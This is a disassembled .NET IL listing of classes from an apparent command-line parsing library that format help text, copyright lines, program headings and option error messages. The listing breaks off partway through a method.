.class private abstract auto ansi sealed beforefieldinit CommandLine.StringUtil
       extends [mscorlib]System.Object
{
  .method public hidebysig static string 
          Spaces(int32 count) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldc.i4.s   32
    IL_0002:  ldarg.0
    IL_0003:  newobj     instance void [mscorlib]System.String::.ctor(char,
                                                                      int32)
    IL_0008:  ret
  } // end of method StringUtil::Spaces

} // end of class CommandLine.StringUtil

.class public abstract auto ansi beforefieldinit CommandLine.Text.BaseSentenceBuilder
       extends [mscorlib]System.Object
{
  .method public hidebysig static class CommandLine.Text.BaseSentenceBuilder 
          CreateBuiltIn() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  newobj     instance void CommandLine.Text.EnglishSentenceBuilder::.ctor()
    IL_0005:  ret
  } // end of method BaseSentenceBuilder::CreateBuiltIn

  .method public hidebysig newslot specialname abstract virtual 
          instance string  get_OptionWord() cil managed
  {
  } // end of method BaseSentenceBuilder::get_OptionWord

  .method public hidebysig newslot specialname abstract virtual 
          instance string  get_AndWord() cil managed
  {
  } // end of method BaseSentenceBuilder::get_AndWord

  .method public hidebysig newslot specialname abstract virtual 
          instance string  get_RequiredOptionMissingText() cil managed
  {
  } // end of method BaseSentenceBuilder::get_RequiredOptionMissingText

  .method public hidebysig newslot specialname abstract virtual 
          instance string  get_ViolatesFormatText() cil managed
  {
  } // end of method BaseSentenceBuilder::get_ViolatesFormatText

  .method public hidebysig newslot specialname abstract virtual 
          instance string  get_ViolatesMutualExclusivenessText() cil managed
  {
  } // end of method BaseSentenceBuilder::get_ViolatesMutualExclusivenessText

  .method public hidebysig newslot specialname abstract virtual 
          instance string  get_ErrorsHeadingText() cil managed
  {
  } // end of method BaseSentenceBuilder::get_ErrorsHeadingText

  .method family hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method BaseSentenceBuilder::.ctor

  .property instance string OptionWord()
  {
    .get instance string CommandLine.Text.BaseSentenceBuilder::get_OptionWord()
  } // end of property BaseSentenceBuilder::OptionWord
  .property instance string AndWord()
  {
    .get instance string CommandLine.Text.BaseSentenceBuilder::get_AndWord()
  } // end of property BaseSentenceBuilder::AndWord
  .property instance string RequiredOptionMissingText()
  {
    .get instance string CommandLine.Text.BaseSentenceBuilder::get_RequiredOptionMissingText()
  } // end of property BaseSentenceBuilder::RequiredOptionMissingText
  .property instance string ViolatesFormatText()
  {
    .get instance string CommandLine.Text.BaseSentenceBuilder::get_ViolatesFormatText()
  } // end of property BaseSentenceBuilder::ViolatesFormatText
  .property instance string ViolatesMutualExclusivenessText()
  {
    .get instance string CommandLine.Text.BaseSentenceBuilder::get_ViolatesMutualExclusivenessText()
  } // end of property BaseSentenceBuilder::ViolatesMutualExclusivenessText
  .property instance string ErrorsHeadingText()
  {
    .get instance string CommandLine.Text.BaseSentenceBuilder::get_ErrorsHeadingText()
  } // end of property BaseSentenceBuilder::ErrorsHeadingText
} // end of class CommandLine.Text.BaseSentenceBuilder

.class public auto ansi beforefieldinit CommandLine.Text.EnglishSentenceBuilder
       extends CommandLine.Text.BaseSentenceBuilder
{
  .method public hidebysig specialname virtual 
          instance string  get_OptionWord() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldstr      "option"
    IL_0005:  ret
  } // end of method EnglishSentenceBuilder::get_OptionWord

  .method public hidebysig specialname virtual 
          instance string  get_AndWord() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldstr      "and"
    IL_0005:  ret
  } // end of method EnglishSentenceBuilder::get_AndWord

  .method public hidebysig specialname virtual 
          instance string  get_RequiredOptionMissingText() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldstr      "required option is missing"
    IL_0005:  ret
  } // end of method EnglishSentenceBuilder::get_RequiredOptionMissingText

  .method public hidebysig specialname virtual 
          instance string  get_ViolatesFormatText() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldstr      "violates format"
    IL_0005:  ret
  } // end of method EnglishSentenceBuilder::get_ViolatesFormatText

  .method public hidebysig specialname virtual 
          instance string  get_ViolatesMutualExclusivenessText() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldstr      "violates mutual exclusiveness"
    IL_0005:  ret
  } // end of method EnglishSentenceBuilder::get_ViolatesMutualExclusivenessText

  .method public hidebysig specialname virtual 
          instance string  get_ErrorsHeadingText() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldstr      "ERROR(S):"
    IL_0005:  ret
  } // end of method EnglishSentenceBuilder::get_ErrorsHeadingText

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.Text.BaseSentenceBuilder::.ctor()
    IL_0006:  ret
  } // end of method EnglishSentenceBuilder::.ctor

  .property instance string OptionWord()
  {
    .get instance string CommandLine.Text.EnglishSentenceBuilder::get_OptionWord()
  } // end of property EnglishSentenceBuilder::OptionWord
  .property instance string AndWord()
  {
    .get instance string CommandLine.Text.EnglishSentenceBuilder::get_AndWord()
  } // end of property EnglishSentenceBuilder::AndWord
  .property instance string RequiredOptionMissingText()
  {
    .get instance string CommandLine.Text.EnglishSentenceBuilder::get_RequiredOptionMissingText()
  } // end of property EnglishSentenceBuilder::RequiredOptionMissingText
  .property instance string ViolatesFormatText()
  {
    .get instance string CommandLine.Text.EnglishSentenceBuilder::get_ViolatesFormatText()
  } // end of property EnglishSentenceBuilder::ViolatesFormatText
  .property instance string ViolatesMutualExclusivenessText()
  {
    .get instance string CommandLine.Text.EnglishSentenceBuilder::get_ViolatesMutualExclusivenessText()
  } // end of property EnglishSentenceBuilder::ViolatesMutualExclusivenessText
  .property instance string ErrorsHeadingText()
  {
    .get instance string CommandLine.Text.EnglishSentenceBuilder::get_ErrorsHeadingText()
  } // end of property EnglishSentenceBuilder::ErrorsHeadingText
} // end of class CommandLine.Text.EnglishSentenceBuilder

.class public auto ansi beforefieldinit CommandLine.Text.CopyrightInfo
       extends [mscorlib]System.Object
{
  .field private initonly bool _isSymbolUpper
  .field private initonly int32[] _years
  .field private initonly string _author
  .field private static initonly string _defaultCopyrightWord
  .field private static initonly string _symbolLower
  .field private static initonly string _symbolUpper
  .field private class [mscorlib]System.Text.StringBuilder _builder
  .method family hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method CopyrightInfo::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string author,
                               int32 year) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  7
    .locals init ([0] int32[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.1
    IL_0002:  ldarg.1
    IL_0003:  ldc.i4.1
    IL_0004:  newarr     [mscorlib]System.Int32
    IL_0009:  stloc.0
    IL_000a:  ldloc.0
    IL_000b:  ldc.i4.0
    IL_000c:  ldarg.2
    IL_000d:  stelem.i4
    IL_000e:  ldloc.0
    IL_000f:  call       instance void CommandLine.Text.CopyrightInfo::.ctor(bool,
                                                                             string,
                                                                             int32[])
    IL_0014:  ret
  } // end of method CopyrightInfo::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string author,
                               int32[] years) cil managed
  {
    .param [2]
    .custom instance void [mscorlib]System.ParamArrayAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.1
    IL_0002:  ldarg.1
    IL_0003:  ldarg.2
    IL_0004:  call       instance void CommandLine.Text.CopyrightInfo::.ctor(bool,
                                                                             string,
                                                                             int32[])
    IL_0009:  ret
  } // end of method CopyrightInfo::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(bool isSymbolUpper,
                               string author,
                               int32[] years) cil managed
  {
    .param [3]
    .custom instance void [mscorlib]System.ParamArrayAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       88 (0x58)
    .maxstack  12
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.2
    IL_0007:  ldstr      "author"
    IL_000c:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0011:  ldarg.3
    IL_0012:  ldstr      "years"
    IL_0017:  call       void CommandLine.Assumes::NotZeroLength<int32>(!!0[],
                                                                        string)
    IL_001c:  ldarg.0
    IL_001d:  ldarg.1
    IL_001e:  stfld      bool CommandLine.Text.CopyrightInfo::_isSymbolUpper
    IL_0023:  ldarg.0
    IL_0024:  ldarg.2
    IL_0025:  stfld      string CommandLine.Text.CopyrightInfo::_author
    IL_002a:  ldarg.0
    IL_002b:  ldarg.3
    IL_002c:  stfld      int32[] CommandLine.Text.CopyrightInfo::_years
    IL_0031:  ldarg.0
    IL_0032:  ldarg.0
    IL_0033:  callvirt   instance string CommandLine.Text.CopyrightInfo::get_CopyrightWord()
    IL_0038:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_003d:  ldarg.2
    IL_003e:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0043:  add
    IL_0044:  ldc.i4.4
    IL_0045:  ldarg.3
    IL_0046:  ldlen
    IL_0047:  conv.i4
    IL_0048:  mul
    IL_0049:  add
    IL_004a:  ldc.i4.s   10
    IL_004c:  add
    IL_004d:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0052:  stfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_0057:  ret
  } // end of method CopyrightInfo::.ctor

  .method public hidebysig virtual instance string 
          ToString() cil managed
  {
    // Code size       164 (0xa4)
    .maxstack  18
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_0006:  ldarg.0
    IL_0007:  callvirt   instance string CommandLine.Text.CopyrightInfo::get_CopyrightWord()
    IL_000c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0011:  pop
    IL_0012:  ldarg.0
    IL_0013:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_0018:  ldc.i4.s   32
    IL_001a:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(char)
    IL_001f:  pop
    IL_0020:  ldarg.0
    IL_0021:  ldfld      bool CommandLine.Text.CopyrightInfo::_isSymbolUpper
    IL_0026:  brfalse    IL_0041

    IL_002b:  ldarg.0
    IL_002c:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_0031:  ldsfld     string CommandLine.Text.CopyrightInfo::_symbolUpper
    IL_0036:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_003b:  pop
    IL_003c:  br         IL_0052

    IL_0041:  ldarg.0
    IL_0042:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_0047:  ldsfld     string CommandLine.Text.CopyrightInfo::_symbolLower
    IL_004c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0051:  pop
    IL_0052:  ldarg.0
    IL_0053:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_0058:  ldc.i4.s   32
    IL_005a:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(char)
    IL_005f:  pop
    IL_0060:  ldarg.0
    IL_0061:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_0066:  ldarg.0
    IL_0067:  ldarg.0
    IL_0068:  ldfld      int32[] CommandLine.Text.CopyrightInfo::_years
    IL_006d:  callvirt   instance string CommandLine.Text.CopyrightInfo::FormatYears(int32[])
    IL_0072:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0077:  pop
    IL_0078:  ldarg.0
    IL_0079:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_007e:  ldc.i4.s   32
    IL_0080:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(char)
    IL_0085:  pop
    IL_0086:  ldarg.0
    IL_0087:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_008c:  ldarg.0
    IL_008d:  ldfld      string CommandLine.Text.CopyrightInfo::_author
    IL_0092:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0097:  pop
    IL_0098:  ldarg.0
    IL_0099:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.CopyrightInfo::_builder
    IL_009e:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_00a3:  ret
  } // end of method CopyrightInfo::ToString

  .method public hidebysig specialname static 
          string  op_Implicit(class CommandLine.Text.CopyrightInfo info) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0006:  ret
  } // end of method CopyrightInfo::op_Implicit

  .method family hidebysig newslot specialname virtual 
          instance string  get_CopyrightWord() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     string CommandLine.Text.CopyrightInfo::_defaultCopyrightWord
    IL_0005:  ret
  } // end of method CopyrightInfo::get_CopyrightWord

  .method family hidebysig newslot virtual 
          instance string  FormatYears(int32[] years) cil managed
  {
    // Code size       141 (0x8d)
    .maxstack  10
    .locals init ([0] class [mscorlib]System.Text.StringBuilder V_0,
             [1] int32 V_1,
             [2] int32 V_2)
    IL_0000:  ldarg.1
    IL_0001:  ldlen
    IL_0002:  conv.i4
    IL_0003:  ldc.i4.1
    IL_0004:  bne.un     IL_001b

    IL_0009:  ldarg.1
    IL_000a:  ldc.i4.0
    IL_000b:  ldelema    [mscorlib]System.Int32
    IL_0010:  call       class [mscorlib]System.Globalization.CultureInfo [mscorlib]System.Globalization.CultureInfo::get_InvariantCulture()
    IL_0015:  call       instance string [mscorlib]System.Int32::ToString(class [mscorlib]System.IFormatProvider)
    IL_001a:  ret

    IL_001b:  ldarg.1
    IL_001c:  ldlen
    IL_001d:  conv.i4
    IL_001e:  ldc.i4.6
    IL_001f:  mul
    IL_0020:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0025:  stloc.0
    IL_0026:  ldc.i4.0
    IL_0027:  stloc.1
    IL_0028:  br         IL_0080

    IL_002d:  ldloc.0
    IL_002e:  ldarg.1
    IL_002f:  ldloc.1
    IL_0030:  ldelema    [mscorlib]System.Int32
    IL_0035:  call       class [mscorlib]System.Globalization.CultureInfo [mscorlib]System.Globalization.CultureInfo::get_InvariantCulture()
    IL_003a:  call       instance string [mscorlib]System.Int32::ToString(class [mscorlib]System.IFormatProvider)
    IL_003f:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0044:  pop
    IL_0045:  ldloc.1
    IL_0046:  ldc.i4.1
    IL_0047:  add
    IL_0048:  stloc.2
    IL_0049:  ldloc.2
    IL_004a:  ldarg.1
    IL_004b:  ldlen
    IL_004c:  conv.i4
    IL_004d:  bge        IL_007c

    IL_0052:  ldarg.1
    IL_0053:  ldloc.2
    IL_0054:  ldelem.i4
    IL_0055:  ldarg.1
    IL_0056:  ldloc.1
    IL_0057:  ldelem.i4
    IL_0058:  sub
    IL_0059:  ldc.i4.1
    IL_005a:  ble        IL_0070

    IL_005f:  ldloc.0
    IL_0060:  ldstr      " - "
    IL_0065:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_006a:  pop
    IL_006b:  br         IL_007c

    IL_0070:  ldloc.0
    IL_0071:  ldstr      ", "
    IL_0076:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_007b:  pop
    IL_007c:  ldloc.1
    IL_007d:  ldc.i4.1
    IL_007e:  add
    IL_007f:  stloc.1
    IL_0080:  ldloc.1
    IL_0081:  ldarg.1
    IL_0082:  ldlen
    IL_0083:  conv.i4
    IL_0084:  blt.s      IL_002d

    IL_0086:  ldloc.0
    IL_0087:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_008c:  ret
  } // end of method CopyrightInfo::FormatYears

  .method private hidebysig specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldstr      "Copyright"
    IL_0005:  stsfld     string CommandLine.Text.CopyrightInfo::_defaultCopyrightWord
    IL_000a:  ldstr      "(c)"
    IL_000f:  stsfld     string CommandLine.Text.CopyrightInfo::_symbolLower
    IL_0014:  ldstr      "(C)"
    IL_0019:  stsfld     string CommandLine.Text.CopyrightInfo::_symbolUpper
    IL_001e:  ret
  } // end of method CopyrightInfo::.cctor

  .property instance string CopyrightWord()
  {
    .get instance string CommandLine.Text.CopyrightInfo::get_CopyrightWord()
  } // end of property CopyrightInfo::CopyrightWord
} // end of class CommandLine.Text.CopyrightInfo

.class public auto ansi beforefieldinit CommandLine.Text.HeadingInfo
       extends [mscorlib]System.Object
{
  .field private initonly string _programName
  .field private initonly string _version
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string programName) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldnull
    IL_0003:  call       instance void CommandLine.Text.HeadingInfo::.ctor(string,
                                                                           string)
    IL_0008:  ret
  } // end of method HeadingInfo::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string programName,
                               string version) cil managed
  {
    // Code size       32 (0x20)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "programName"
    IL_000c:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      string CommandLine.Text.HeadingInfo::_programName
    IL_0018:  ldarg.0
    IL_0019:  ldarg.2
    IL_001a:  stfld      string CommandLine.Text.HeadingInfo::_version
    IL_001f:  ret
  } // end of method HeadingInfo::.ctor

  .method public hidebysig virtual instance string 
          ToString() cil managed
  {
    // Code size       103 (0x67)
    .maxstack  11
    .locals init ([0] bool V_0,
             [1] class [mscorlib]System.Text.StringBuilder V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.Text.HeadingInfo::_version
    IL_0006:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_000b:  stloc.0
    IL_000c:  ldarg.0
    IL_000d:  ldfld      string CommandLine.Text.HeadingInfo::_programName
    IL_0012:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0017:  ldloc.0
    IL_0018:  brfalse    IL_0023

    IL_001d:  ldc.i4.0
    IL_001e:  br         IL_0030

    IL_0023:  ldarg.0
    IL_0024:  ldfld      string CommandLine.Text.HeadingInfo::_version
    IL_0029:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_002e:  ldc.i4.1
    IL_002f:  add
    IL_0030:  add
    IL_0031:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0036:  stloc.1
    IL_0037:  ldloc.1
    IL_0038:  ldarg.0
    IL_0039:  ldfld      string CommandLine.Text.HeadingInfo::_programName
    IL_003e:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0043:  pop
    IL_0044:  ldloc.0
    IL_0045:  brtrue     IL_0060

    IL_004a:  ldloc.1
    IL_004b:  ldc.i4.s   32
    IL_004d:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(char)
    IL_0052:  pop
    IL_0053:  ldloc.1
    IL_0054:  ldarg.0
    IL_0055:  ldfld      string CommandLine.Text.HeadingInfo::_version
    IL_005a:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_005f:  pop
    IL_0060:  ldloc.1
    IL_0061:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0066:  ret
  } // end of method HeadingInfo::ToString

  .method public hidebysig specialname static 
          string  op_Implicit(class CommandLine.Text.HeadingInfo info) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0006:  ret
  } // end of method HeadingInfo::op_Implicit

  .method public hidebysig instance void 
          WriteMessage(string message,
                       class [mscorlib]System.IO.TextWriter writer) cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  15
    .locals init ([0] class [mscorlib]System.Text.StringBuilder V_0)
    IL_0000:  ldarg.1
    IL_0001:  ldstr      "message"
    IL_0006:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_000b:  ldarg.2
    IL_000c:  ldstr      "writer"
    IL_0011:  call       void CommandLine.Assumes::NotNull<class [mscorlib]System.IO.TextWriter>(!!0,
                                                                                                 string)
    IL_0016:  ldarg.0
    IL_0017:  ldfld      string CommandLine.Text.HeadingInfo::_programName
    IL_001c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0021:  ldarg.1
    IL_0022:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0027:  add
    IL_0028:  ldc.i4.2
    IL_0029:  add
    IL_002a:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_002f:  stloc.0
    IL_0030:  ldloc.0
    IL_0031:  ldarg.0
    IL_0032:  ldfld      string CommandLine.Text.HeadingInfo::_programName
    IL_0037:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_003c:  pop
    IL_003d:  ldloc.0
    IL_003e:  ldstr      ": "
    IL_0043:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0048:  pop
    IL_0049:  ldloc.0
    IL_004a:  ldarg.1
    IL_004b:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0050:  pop
    IL_0051:  ldarg.2
    IL_0052:  ldloc.0
    IL_0053:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0058:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
    IL_005d:  ret
  } // end of method HeadingInfo::WriteMessage

  .method public hidebysig instance void 
          WriteMessage(string message) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  call       class [mscorlib]System.IO.TextWriter [mscorlib]System.Console::get_Out()
    IL_0007:  call       instance void CommandLine.Text.HeadingInfo::WriteMessage(string,
                                                                                  class [mscorlib]System.IO.TextWriter)
    IL_000c:  ret
  } // end of method HeadingInfo::WriteMessage

  .method public hidebysig instance void 
          WriteError(string message) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  call       class [mscorlib]System.IO.TextWriter [mscorlib]System.Console::get_Error()
    IL_0007:  call       instance void CommandLine.Text.HeadingInfo::WriteMessage(string,
                                                                                  class [mscorlib]System.IO.TextWriter)
    IL_000c:  ret
  } // end of method HeadingInfo::WriteError

} // end of class CommandLine.Text.HeadingInfo

.class public abstract auto ansi beforefieldinit CommandLine.Text.MultiLineTextAttribute
       extends [mscorlib]System.Attribute
{
  .field private string _line1
  .field private string _line2
  .field private string _line3
  .field private string _line4
  .field private string _line5
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Attribute::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "line1"
    IL_000c:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      string CommandLine.Text.MultiLineTextAttribute::_line1
    IL_0018:  ret
  } // end of method MultiLineTextAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2) cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string)
    IL_0007:  ldarg.2
    IL_0008:  ldstr      "line2"
    IL_000d:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0012:  ldarg.0
    IL_0013:  ldarg.2
    IL_0014:  stfld      string CommandLine.Text.MultiLineTextAttribute::_line2
    IL_0019:  ret
  } // end of method MultiLineTextAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3) cil managed
  {
    // Code size       27 (0x1b)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string)
    IL_0008:  ldarg.3
    IL_0009:  ldstr      "line3"
    IL_000e:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0013:  ldarg.0
    IL_0014:  ldarg.3
    IL_0015:  stfld      string CommandLine.Text.MultiLineTextAttribute::_line3
    IL_001a:  ret
  } // end of method MultiLineTextAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3,
                               string line4) cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.3
    IL_0004:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string,
                                                                                      string)
    IL_0009:  ldarg.s    line4
    IL_000b:  ldstr      "line4"
    IL_0010:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0015:  ldarg.0
    IL_0016:  ldarg.s    line4
    IL_0018:  stfld      string CommandLine.Text.MultiLineTextAttribute::_line4
    IL_001d:  ret
  } // end of method MultiLineTextAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3,
                               string line4,
                               string line5) cil managed
  {
    // Code size       32 (0x20)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.3
    IL_0004:  ldarg.s    line4
    IL_0006:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string,
                                                                                      string,
                                                                                      string)
    IL_000b:  ldarg.s    line5
    IL_000d:  ldstr      "line5"
    IL_0012:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0017:  ldarg.0
    IL_0018:  ldarg.s    line5
    IL_001a:  stfld      string CommandLine.Text.MultiLineTextAttribute::_line5
    IL_001f:  ret
  } // end of method MultiLineTextAttribute::.ctor

  .method assembly hidebysig instance void 
          AddToHelpText(class CommandLine.Text.HelpText helpText,
                        bool before) cil managed
  {
    // Code size       288 (0x120)
    .maxstack  12
    IL_0000:  ldarg.2
    IL_0001:  brfalse    IL_0093

    IL_0006:  ldarg.0
    IL_0007:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line1
    IL_000c:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0011:  brtrue     IL_0022

    IL_0016:  ldarg.1
    IL_0017:  ldarg.0
    IL_0018:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line1
    IL_001d:  callvirt   instance void CommandLine.Text.HelpText::AddPreOptionsLine(string)
    IL_0022:  ldarg.0
    IL_0023:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line2
    IL_0028:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_002d:  brtrue     IL_003e

    IL_0032:  ldarg.1
    IL_0033:  ldarg.0
    IL_0034:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line2
    IL_0039:  callvirt   instance void CommandLine.Text.HelpText::AddPreOptionsLine(string)
    IL_003e:  ldarg.0
    IL_003f:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line3
    IL_0044:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0049:  brtrue     IL_005a

    IL_004e:  ldarg.1
    IL_004f:  ldarg.0
    IL_0050:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line3
    IL_0055:  callvirt   instance void CommandLine.Text.HelpText::AddPreOptionsLine(string)
    IL_005a:  ldarg.0
    IL_005b:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line4
    IL_0060:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
